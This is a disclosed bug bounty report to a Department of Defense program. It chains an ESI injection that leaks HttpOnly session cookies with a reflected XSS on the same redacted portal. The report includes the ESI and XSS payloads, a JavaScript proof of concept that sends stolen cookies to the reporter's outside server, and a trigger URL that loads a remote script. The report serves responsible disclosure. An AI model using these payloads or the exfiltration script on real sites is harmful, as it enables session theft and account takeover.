# [hta3] Chain of ESI Injection & Reflected XSS leading to Account Takeover on [███]

## Report Details
- **Report ID**: 1073780
- **URL**: https://hackerone.com/reports/1073780
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-01-07T20:34:35.137Z
- **Disclosed**: 2022-10-14T13:44:31.544Z

## Reporter
- **Username**: jr0ch17
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi,

## Summary
There is an **ESI injection** vulnerability in the [https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults](https://████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults) endpoint on the **ms** parameter. With this injection, we're able to extract session cookies that have the HttpOnly flag by using this payload.

```xml
<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>
```

We also found a **Reflected XSS** vulnerability in the [https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree](https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree) endpoint on the **title** parameter

By chaining these 2 bugs together, we're able to steal session cookies and take over a victim user's account.
&nbsp;

## Steps To Reproduce
1- By browsing here `https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=`, we're able to see your cookies in the **Search** field between the `lol` strings at the beginning and end.
█████████
2- When browsing here, `https://█████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><svg/onload=alert(domain)>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup`, we can see an alert box showing the vulnerable domain caused by this HTML and JavaScript code in the **title** parameter.

```html
</title><svg/onload=alert(domain)>
```

████████

3- To chain these 2 bugs together, we created the following PoC. This JavaScript code is fetching the URL containing the ESI injection, grabbing the value of the cookies in the response and then sending them over to our server in order to steal them.

```javascript
fetch('https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=').then(function (response) {
		return response.text();
}).then(function (html) {

	var parser = new DOMParser();
	var doc = parser.parseFromString(html, 'text/html');
  
  //var input = doc.querySelector('input')[0];
  var cookies = doc.getElementById("x61_ms").value;
  fetch(`https://www.jr0ch17.com/ato?cookies=${cookies}`);

}).catch(function (err) {
	// There was an error
	console.warn('Something went wrong.', err);
});
```

To trigger this whole PoC, you can browse to this URL. You can replace the server with your own to reproduce it.

```
https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><script/src='https://www.jr0ch17.com/hta3.js'></script>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup
```

As you can see, the XSS payload is now the following.

```html
</title><script/src='https://www.jr0ch17.com/hta3.js'>
```

We can then see that we have received the victim's cookies including the session cookie which has the HttpOnly flag.
██████████
&nbsp;

## Impact

By chaining these 2 vulnerabilities together and by tricking a victim user into clicking a link, an attacker is able to steal their session cookies which have the HttpOnly flag and take over their account. With an ESI injection and depending on the configuration, it's also potentially possible to get an SSRF and get access to internal resources. We're still exploring that area of the bug at the moment so we'll provide updates on if we're able to get further with it.

Let me know if you have any questions or require more details.

Thanks,
@jr0ch17

## Attachments
No attachments
